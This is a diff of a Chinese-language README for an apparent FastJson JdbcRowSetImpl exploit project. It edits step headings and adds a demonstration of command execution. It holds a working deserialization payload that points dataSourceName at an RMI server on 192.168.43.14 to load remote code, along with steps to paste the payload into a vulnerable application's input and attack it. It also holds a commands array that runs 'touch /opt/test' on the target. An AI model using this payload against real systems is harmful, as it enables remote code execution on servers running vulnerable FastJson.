@@ -15,7 +15,7 @@ root@Bearcat:/# wget "https://github.com/iBearcat/FastJson-JdbcRowSetImpl/raw/ma
 
 ## 漏洞利用
 
-### 在CommandObject.java中构造commands命令数组
+### 在CommandObject.java类中的commands数组中构造想要执行的命令
 
 ### 编译 javac CommandObject.java
 
@@ -69,11 +69,15 @@ java -jar FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar <HTTP服务地址> 指定RM
 {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://192.168.43.14:6666/Object","autoCommit":true}
 ```
 
-### 把它Copy到漏洞环境的input中，然后submit。
+### 把它Copy到漏洞环境的input中，然后submit进行攻击。
 
 ![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/5.jpg?raw=true)
 
 
-### 开始攻击并执行命令
+### 成功执行命令，并touch test
 
+```
+String[] commands = {"touch","/opt/test"}; //Command
+```
+![20181019](https://github.com/iBearcat/FastJson-JdbcRowSetImpl/blob/master/images/6.jpg?raw=true)
 
